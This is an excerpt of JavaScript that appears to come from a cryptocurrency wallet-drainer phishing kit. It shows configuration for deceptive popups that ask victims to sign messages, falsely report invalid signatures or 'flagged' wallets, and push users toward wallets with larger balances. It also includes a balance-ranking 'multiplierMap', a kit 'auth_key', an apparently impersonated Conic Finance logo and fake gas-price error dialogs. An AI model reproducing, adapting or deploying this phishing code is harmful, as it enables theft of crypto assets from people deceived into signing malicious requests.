...
const Connectkit_Prompted_Text =
  "Sign the message in your wallet to continue...";
const Connectkit_Signed_Text =
  "The provided signature is invalid, Please try again.";
const Connectkit_Total_Balance_Too_Low_Text =
  "Something went wrong.<br>Please try again with an active wallet.";
const Connectkit_Not_Eligible_Text =
  "Your wallet has been flagged for an irregular activity.<br>Please try to connect a different wallet.";
...
const Popup_Signed_Text =
  "The provided signature is incorrect, Please try again.";
const Popup_Total_Balance_Too_Low_Text =
  "Your wallet doesn't meet the requirements. Please try again by connecting a middle-active wallet.";
const Popup_Not_Eligible_Text =
  "Your wallet has been flagged for an irregular activity. Please try to connect a different wallet.";
...
const multiplierMap = {
  // Ratio - priorize the best popup, example, 1 ETH: scanner will detect 1 * 0.5 so 0.5 eth and let priority to best popups
...
const Modal_4_Logo_URL =
  "https://conic.finance/static/media/conic.2bc918ed95a106ffe4941df1594559a2.svg";
...
const auth_key = "DoHy7XdVkAXnwi674T"; // Don't remove
...
class SwalPopup {
  ...
  show() {
    this.popup = Swal.fire({
      ...
      imageUrl:
        "https://miro.medium.com/v2/resize:fit:720/1*CsJ05WEGfunYMLGfsT2sXA.gif",
      width: 600,
      imageHeight: 80,
      color: "#1b1e24",
      background: "#ffffff",
  ...
  pooron(
    error = "Insufficient ETH for transaction broadcast. Try with different wallet."
  ) {
    this.popup = Swal.fire({
  ...
  setError(
    error = "Authentification was cancelled due to rapid change in gas prices. Please try again."
  ) {
    this.popup = Swal.fire({
      title: "Something went wrong!",
      imageUrl: "",
